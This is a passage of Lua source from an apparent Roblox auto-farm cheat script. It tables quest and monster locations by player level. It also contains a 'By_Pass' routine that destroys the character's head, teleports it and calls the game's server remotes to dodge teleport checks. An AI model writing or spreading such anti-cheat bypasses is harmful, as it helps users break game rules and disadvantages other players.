                                CFrameQuest = CFrame.new(-2442.65015, 73.0511475, -3219.11523, -0.873540044, 4.2329841e-08, -0.486752301, 5.64383384e-08, 1, -1.43220786e-08, 0.486752301, -3.99823996e-08, -0.873540044)
                                CFrameMon = CFrame.new(-1868.67688, 73.0011826, -3321.66333, -0.971402287, 1.06502087e-08, 0.237439692, 3.68856199e-08, 1, 1.06050372e-07, -0.237439692, 1.11775684e-07, -0.971402287)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 950 or MyLevel <= 974 then -- Zombie
                                Ms = "Zombie"
                                NaemQuest = "ZombieQuest"
                                LevelQuest = 1
                                NameMon = "Zombie"
                                CFrameQuest = CFrame.new(-5492.79395, 48.5151672, -793.710571, 0.321800292, -6.24695815e-08, 0.946807742, 4.05616092e-08, 1, 5.21931227e-08, -0.946807742, 2.16082796e-08, 0.321800292)
                                CFrameMon = CFrame.new(-5634.83838, 126.067039, -697.665039, -0.992770672, 6.77618939e-09, 0.120025545, 1.65461245e-08, 1, 8.04023372e-08, -0.120025545, 8.18070234e-08, -0.992770672)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 975 or MyLevel <= 999 then -- Vampire
                                Ms = "Vampire"
                                NaemQuest = "ZombieQuest"
                                LevelQuest = 2
                                NameMon = "Vampire"
                                CFrameQuest = CFrame.new(-5492.79395, 48.5151672, -793.710571, 0.321800292, -6.24695815e-08, 0.946807742, 4.05616092e-08, 1, 5.21931227e-08, -0.946807742, 2.16082796e-08, 0.321800292)
                                CFrameMon = CFrame.new(-6030.32031, 6.4377408, -1313.5564, -0.856965423, 3.9138893e-08, -0.515373945, -1.12178942e-08, 1, 9.45958547e-08, 0.515373945, 8.68467822e-08, -0.856965423)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1000 or MyLevel <= 1049 then -- Snow Trooper0 **
                                Ms = "Snow Trooper"
                                NaemQuest = "SnowMountainQuest"
                                LevelQuest = 1
                                NameMon = "Snow Trooper"
                                CFrameQuest = CFrame.new(604.964966, 401.457062, -5371.69287, 0.353063971, 1.89520435e-08, -0.935599446, -5.81846002e-08, 1, -1.70033754e-09, 0.935599446, 5.50377841e-08, 0.353063971)
                                CFrameMon = CFrame.new(535.893433, 401.457062, -5329.6958, -0.999524176, 0, 0.0308452044, 0, 1, -0, -0.0308452044, 0, -0.999524176)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1050 or MyLevel <= 1099 then -- Winter Warrior0
                                Ms = "Winter Warrior"
                                NaemQuest = "SnowMountainQuest"
                                LevelQuest = 2
                                NameMon = "Winter Warrior"
                                CFrameQuest = CFrame.new(604.964966, 401.457062, -5371.69287, 0.353063971, 1.89520435e-08, -0.935599446, -5.81846002e-08, 1, -1.70033754e-09, 0.935599446, 5.50377841e-08, 0.353063971)
                                CFrameMon = CFrame.new(1223.7417, 454.575226, -5170.02148, 0.473996818, 2.56845354e-08, 0.880526543, -5.62456428e-08, 1, 1.10811016e-09, -0.880526543, -5.00510211e-08, 0.473996818)
                            
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1100 or MyLevel <= 1124 then -- Lab Subordinate1
                                Ms = "Lab Subordinate"
                                NaemQuest = "IceSideQuest"
                                LevelQuest = 1
                                NameMon = "Lab Subordinate"
                                CFrameQuest = CFrame.new(-6060.10693, 15.9868021, -4904.7876, -0.411000341, -5.06538868e-07, 0.91163528, 1.26306062e-07, 1, 6.12581289e-07, -0.91163528, 3.66916197e-07, -0.411000341)
                                CFrameMon = CFrame.new(-5769.2041, 37.9288292, -4468.38721, -0.569419742, -2.49055017e-08, 0.822046936, -6.96206541e-08, 1, -1.79282633e-08, -0.822046936, -6.74401548e-08, -0.569419742)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1125 or MyLevel <= 1174 then -- Horned Warrior1
                                Ms = "Horned Warrior"
                                NaemQuest = "IceSideQuest"
                                LevelQuest = 2
                                NameMon = "Horned Warrior"
                                CFrameQuest = CFrame.new(-6060.10693, 15.9868021, -4904.7876, -0.411000341, -5.06538868e-07, 0.91163528, 1.26306062e-07, 1, 6.12581289e-07, -0.91163528, 3.66916197e-07, -0.411000341)
                                CFrameMon = CFrame.new(-6400.85889, 24.7645149, -5818.63574, -0.964845479, 8.65926566e-08, -0.262817472, 3.98261392e-07, 1, -1.13260398e-06, 0.262817472, -1.19745812e-06, -0.964845479)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1175 or MyLevel <= 1199 then -- Magma Ninja1
                                Ms = "Magma Ninja"
                                NaemQuest = "FireSideQuest"
                                LevelQuest = 1
                                NameMon = "Magma Ninja"
                                CFrameQuest = CFrame.new(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
                                CFrameMon = CFrame.new(-5496.65576, 58.6890411, -5929.76855, -0.885073781, 0, -0.465450764, 0, 1.00000012, -0, 0.465450764, 0, -0.885073781)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1200 or MyLevel <= 1249 then -- Lava Pirate2
                                Ms = "Lava Pirate"
                                NaemQuest = "FireSideQuest"
                                LevelQuest = 2
                                NameMon = "Lava Pirate"
                                CFrameQuest = CFrame.new(-5431.09473, 15.9868021, -5296.53223, 0.831796765, 1.15322464e-07, -0.555080295, -1.10814341e-07, 1, 4.17010995e-08, 0.555080295, 2.68240168e-08, 0.831796765)
                                CFrameMon = CFrame.new(-5169.71729, 34.1234779, -4669.73633, -0.196780294, 0, 0.98044765, 0, 1.00000012, -0, -0.98044765, 0, -0.196780294)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1250 or MyLevel <= 1274 then -- Ship Deckhand2
                                Ms = "Ship Deckhand"
                                NaemQuest = "ShipQuest1"
                                LevelQuest = 1
                                NameMon = "Ship Deckhand"
                                CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                                CFrameMon = CFrame.new(1163.80872, 138.288452, 33058.4258, -0.998580813, 5.49076979e-08, -0.0532564968, 5.57436763e-08, 1, -1.42118655e-08, 0.0532564968, -1.71604082e-08, -0.998580813)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                end
                            elseif MyLevel == 1275 or MyLevel <= 1299 then -- Ship Engineer2
                                Ms = "Ship Engineer"
                                NaemQuest = "ShipQuest1"
                                LevelQuest = 2
                                NameMon = "Ship Engineer"
                                CFrameQuest = CFrame.new(1037.80127, 125.092171, 32911.6016, -0.244533166, -0, -0.969640911, -0, 1.00000012, -0, 0.96964103, 0, -0.244533136)
                                CFrameMon = CFrame.new(916.666504, 44.0920448, 32917.207, -0.99746871, -4.85034697e-08, -0.0711069331, -4.8925461e-08, 1, 4.19294288e-09, 0.0711069331, 7.66126895e-09, -0.99746871)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                end
                            elseif MyLevel == 1300 or MyLevel <= 1324 then -- Ship Steward3
                                Ms = "Ship Steward"
                                NaemQuest = "ShipQuest2"
                                LevelQuest = 1
                                NameMon = "Ship Steward"
                                CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                                CFrameMon = CFrame.new(918.743286, 129.591064, 33443.4609, -0.999792814, -1.7070947e-07, -0.020350717, -1.72559169e-07, 1, 8.91351277e-08, 0.020350717, 9.2628369e-08, -0.999792814)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                end
                            elseif MyLevel == 1325 or MyLevel <= 1349 then -- Ship Officer3
                                Ms = "Ship Officer"
                                NaemQuest = "ShipQuest2"
                                LevelQuest = 2
                                NameMon = "Ship Officer"
                                CFrameQuest = CFrame.new(968.80957, 125.092171, 33244.125, -0.869560242, 1.51905191e-08, -0.493826836, 1.44108379e-08, 1, 5.38534195e-09, 0.493826836, -2.43357912e-09, -0.869560242)
                                CFrameMon = CFrame.new(786.051941, 181.474106, 33303.2969, 0.999285698, -5.32193063e-08, 0.0377905183, 5.68968588e-08, 1, -9.62386864e-08, -0.0377905183, 9.83201005e-08, 0.999285698)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameQuest.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("requestEntrance",Vector3.new(923.21252441406, 126.9760055542, 32852.83203125))
                                end
                            elseif MyLevel == 1350 or MyLevel <= 1374 then -- Arctic Warrior3
                                Ms = "Arctic Warrior"
                                NaemQuest = "FrostQuest"
                                LevelQuest = 1
                                NameMon = "Arctic Warrior"
                                CFrameQuest = CFrame.new(5669.43506, 28.2117786, -6482.60107, 0.888092756, 1.02705066e-07, 0.459664226, -6.20391774e-08, 1, -1.03572376e-07, -0.459664226, 6.34646895e-08, 0.888092756)
                                CFrameMon = CFrame.new(5995.07471, 57.3188477, -6183.47314, 0.702747107, -1.53454167e-07, -0.711440146, -1.08168464e-07, 1, -3.22542007e-07, 0.711440146, 3.03620908e-07, 0.702747107)
                                if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 10000 then
                                    game.Players.LocalPlayer.Character.Head:Destroy()
                                    game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                    wait(1)
                                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                                end
                            elseif MyLevel == 1375 or MyLevel <= 1424 then -- Snow Lurker3
                                Ms = "Snow Lurker"
                                NaemQuest = "FrostQuest"
                                LevelQuest = 2
                                NameMon = "Snow Lurker"
                                CFrameQuest = CFrame.new(5669.43506, 28.2117786, -6482.60107, 0.888092756, 1.02705066e-07, 0.459664226, -6.20391774e-08, 1, -1.03572376e-07, -0.459664226, 6.34646895e-08, 0.888092756)
                                CFrameMon = CFrame.new(5518.00684, 60.5559731, -6828.80518, -0.650781393, -3.64292951e-08, 0.759265184, -4.07668654e-09, 1, 4.44854642e-08, -0.759265184, 2.58550248e-08, -0.650781393)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1425 or MyLevel <= 1449 then -- Sea Soldier4
                                Ms = "Sea Soldier"
                                NaemQuest = "ForgottenQuest"
                                LevelQuest = 1
                                NameMon = "Sea Soldier"
                                CFrameQuest = CFrame.new(-3052.99097, 236.881363, -10148.1943, -0.997911751, 4.42321983e-08, 0.064591676, 4.90968759e-08, 1, 7.37270085e-08, -0.064591676, 7.67442998e-08, -0.997911751)
                                CFrameMon = CFrame.new(-3029.78467, 66.944252, -9777.38184, -0.998552859, 1.09555076e-08, 0.0537791774, 7.79564235e-09, 1, -5.89660658e-08, -0.0537791774, -5.84614881e-08, -0.998552859)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel >= 1450 then -- Water Fighter4
                                Ms = "Water Fighter"
                                NaemQuest = "ForgottenQuest"
                                LevelQuest = 2
                                NameMon = "Water Fighter"
                                CFrameQuest = CFrame.new(-3052.99097, 236.881363, -10148.1943, -0.997911751, 4.42321983e-08, 0.064591676, 4.90968759e-08, 1, 7.37270085e-08, -0.064591676, 7.67442998e-08, -0.997911751)
                                CFrameMon = CFrame.new(-3262.00098, 298.699615, -10553.6943, -0.233570755, -4.57538185e-08, 0.972339869, -5.80986068e-08, 1, 3.30992194e-08, -0.972339869, -4.87605725e-08, -0.233570755)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            end
                        else
                            local MyLevel =  game.Players.LocalPlayer.Data.Level.Value
                            Dis = 240
                            if MyLevel == 1500 or MyLevel <= 1524 then
                                Ms = "Pirate Millionaire"
                                NaemQuest = "PiratePortQuest"
                                LevelQuest = 1
                                NameMon = "Pirate Millionaire"
                                CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                                CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1525 or MyLevel <= 1574 then
                                Ms = "Pistol Billionaire"
                                NaemQuest = "PiratePortQuest"
                                LevelQuest = 2
                                NameMon = "Pistol Billionaire"
                                CFrameQuest = CFrame.new(-290.074677, 42.9034653, 5581.58984, 0.965929627, -0, -0.258804798, 0, 1, -0, 0.258804798, 0, 0.965929627)
                                CFrameMon = CFrame.new(81.164993286133, 43.755737304688, 5724.7021484375)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1575 or MyLevel <= 1599 then
                                Ms = "Dragon Crew Warrior"
                                NaemQuest = "AmazonQuest"
                                LevelQuest = 1
                                NameMon = "Dragon Crew Warrior"
                                CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                                CFrameMon = CFrame.new(6241.9951171875, 51.522083282471, -1243.9771728516)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1600 or MyLevel <= 1624 then
                                Ms = "Dragon Crew Archer"
                                NaemQuest = "AmazonQuest"
                                LevelQuest = 2
                                NameMon = "Dragon Crew Archer"
                                CFrameQuest = CFrame.new(5832.83594, 51.6806107, -1101.51563, 0.898790359, -0, -0.438378751, 0, 1, -0, 0.438378751, 0, 0.898790359)
                                CFrameMon = CFrame.new(6488.9155273438, 383.38375854492, -110.66246032715)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1625 or MyLevel <= 1649 then
                                Ms = "Female Islander"
                                NaemQuest = "AmazonQuest2"
                                LevelQuest = 1
                                NameMon = "Female Islander"
                                CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                                CFrameMon = CFrame.new(4770.4990234375, 758.95520019531, 1069.8680419922)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1650 or MyLevel <= 1699 then
                                Ms = "Giant Islander"
                                NaemQuest = "AmazonQuest2"
                                LevelQuest = 2
                                NameMon = "Giant Islander"
                                CFrameQuest = CFrame.new(5448.86133, 601.516174, 751.130676, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                                CFrameMon = CFrame.new(4530.3540039063, 656.75695800781, -131.60952758789)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1700 or MyLevel <= 1724 then
                                Ms = "Marine Commodore"
                                NaemQuest = "MarineTreeIsland"
                                LevelQuest = 1
                                NameMon = "Marine Commodore"
                                CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                                CFrameMon = CFrame.new(2490.0844726563, 190.4232635498, -7160.0502929688)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1725 or MyLevel <= 1774 then
                                Ms = "Marine Rear Admiral"
                                NaemQuest = "MarineTreeIsland"
                                LevelQuest = 2
                                NameMon = "Marine Rear Admiral"
                                CFrameQuest = CFrame.new(2180.54126, 27.8156815, -6741.5498, -0.965929747, 0, 0.258804798, 0, 1, 0, -0.258804798, 0, -0.965929747)
                                CFrameMon = CFrame.new(3951.3903808594, 229.11549377441, -6912.81640625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1775 or MyLevel <= 1799 then
                                Ms = "Fishman Raider"
                                NaemQuest = "DeepForestIsland3"
                                LevelQuest = 1
                                NameMon = "Fishman Raider"
                                CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                                CFrameMon = CFrame.new(-10322.400390625, 390.94473266602, -8580.0908203125)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1800 or MyLevel <= 1824 then
                                Ms = "Fishman Captain"
                                NaemQuest = "DeepForestIsland3"
                                LevelQuest = 2
                                NameMon = "Fishman Captain"
                                CFrameQuest = CFrame.new(-10581.6563, 330.872955, -8761.18652, -0.882952213, 0, 0.469463557, 0, 1, 0, -0.469463557, 0, -0.882952213)
                                CFrameMon = CFrame.new(-11194.541992188, 442.02795410156, -8608.806640625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1825 or MyLevel <= 1849 then
                                Ms = "Forest Pirate"
                                NaemQuest = "DeepForestIsland"
                                LevelQuest = 1
                                NameMon = "Forest Pirate"
                                CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                                CFrameMon = CFrame.new(-13225.809570313, 428.19387817383, -7753.1245117188)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1850 or MyLevel <= 1899 then
                                Ms = "Mythological Pirate"
                                NaemQuest = "DeepForestIsland"
                                LevelQuest = 2
                                NameMon = "Mythological Pirate"
                                CFrameQuest = CFrame.new(-13234.04, 331.488495, -7625.40137, 0.707134247, -0, -0.707079291, 0, 1, -0, 0.707079291, 0, 0.707134247)
                                CFrameMon = CFrame.new(-13869.172851563, 564.95251464844, -7084.4135742188)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1900 or MyLevel <= 1924 then
                                Ms = "Jungle Pirate"
                                NaemQuest = "DeepForestIsland2"
                                LevelQuest = 1
                                NameMon = "Jungle Pirate"
                                CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                                CFrameMon = CFrame.new(-11982.221679688, 376.32522583008, -10451.415039063)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1925 or MyLevel <= 1974 then
                                Ms = "Musketeer Pirate"
                                NaemQuest = "DeepForestIsland2"
                                LevelQuest = 2
                                NameMon = "Musketeer Pirate"
                                CFrameQuest = CFrame.new(-12680.3818, 389.971039, -9902.01953, -0.0871315002, 0, 0.996196866, 0, 1, 0, -0.996196866, 0, -0.0871315002)
                                CFrameMon = CFrame.new(-13282.3046875, 496.23684692383, -9565.150390625)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 1975 or MyLevel <= 1999 then
                                Ms = "Reborn Skeleton"
                                NaemQuest = "HauntedQuest1"
                                LevelQuest = 1
                                NameMon = "Reborn Skeleton"
                                CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                                CFrameMon = CFrame.new(-8761.3154296875, 164.85829162598, 6161.1567382813)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrameMon
                                wait(1)
                                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("SetSpawnPoint")
                            end
                            elseif MyLevel == 2000 or MyLevel <= 2024 then
                                Ms = "Living Zombie"
                                NaemQuest = "HauntedQuest1"
                                LevelQuest = 2
                                NameMon = "Living Zombie"
                                CFrameQuest = CFrame.new(-9479.2168, 141.215088, 5566.09277, 0, 0, 1, 0, 1, -0, -1, 0, 0)
                                CFrameMon = CFrame.new(-10093.930664063, 237.38233947754, 6180.5654296875)
                            if _G.AutoFarmL and _G.By_Pass and (CFrameMon.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 3000 then
                                game.Players.LocalPlayer.Character.Head:Destroy()
